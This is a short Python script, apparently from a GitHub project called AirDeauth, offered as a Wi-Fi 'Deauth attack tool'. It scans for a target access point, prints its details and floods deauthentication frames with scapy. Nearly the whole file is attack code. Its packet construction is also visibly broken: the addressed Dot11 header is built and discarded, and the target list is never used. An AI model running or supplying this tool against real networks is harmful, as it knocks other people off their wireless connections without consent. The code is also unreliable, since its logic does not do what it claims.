import argparse
from scapy.all import *
import time
import sys
from colorama import Fore
import time 
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
ENDC = "\033[0m"


print(f"""{GREEN}
                      .               .    
 .´  ·  .     .  ·  `.  Airstrike  1.0.0
 :  :  :  (¯)  :  :  :  
 `.  ·  ` /¯\ ´  ·  .´  
   `     /¯¯¯\     ´    https://github.com/amirali115a/AirDeauth

""")


parser = argparse.ArgumentParser(description="Deauth attack tool")
parser.add_argument("-i", "--interface", help="Interface to use", required=True)
parser.add_argument("-b", "--bssid", help="Target BSSID", required=True)
parser.add_argument("-c", "--count", help="Number of packets to send", type=int, default=100)
parser.add_argument("-t", "--time", help="Time between packets (seconds)", type=float, default=0.1)
parser.add_argument("-f", "--file", help="File containing target MAC addresses")
parser.add_argument("-v", "--verbose", help="Show packet information", action="store_true")
args = parser.parse_args()
from wifi import Cell, Scheme

print(f'{BLUE}connecting and scanning Wifi ...')

wifi_networks = Cell.all(args.interface)


target_bssid = args.bssid



for network in wifi_networks:
    if network.address == target_bssid:
        print(f"{YELLOW}------------------------------------------------------")
        print(Fore.CYAN,f"BSSID: {network.address}")
        print(f"SSID: {network.ssid}")
        print(f"Signal Strength: {network.signal}")
        print(f"Frequency: {network.frequency}")
        print(f"Encryption Type: {network.encryption_type}")
        print(f"Channel: {network.channel}")
        print(f"Quality: {network.quality}")
        print(f"Mode: {network.mode}")
        print(f"Bitrates: {network.bitrates}")
        print(f"{YELLOW}------------------------------------------------------")


if args.file:
    with open(args.file, "r") as f:
        targets = f.readlines()
        targets = [target.strip() for target in targets]
else:
    print(BLUE,f'Attacking Deauth To {args.bssid}')
    time.sleep(3)
    targets = [args.bssid]
Dot11(type=0, addr1=args.bssid)
pkt = RadioTap() / scapy.layers.dot11.Dot11Deauth(reason=7)
print(Fore.GREEN,'')
sendp(pkt, inter=args.time, count=args.count, verbose=1)
            
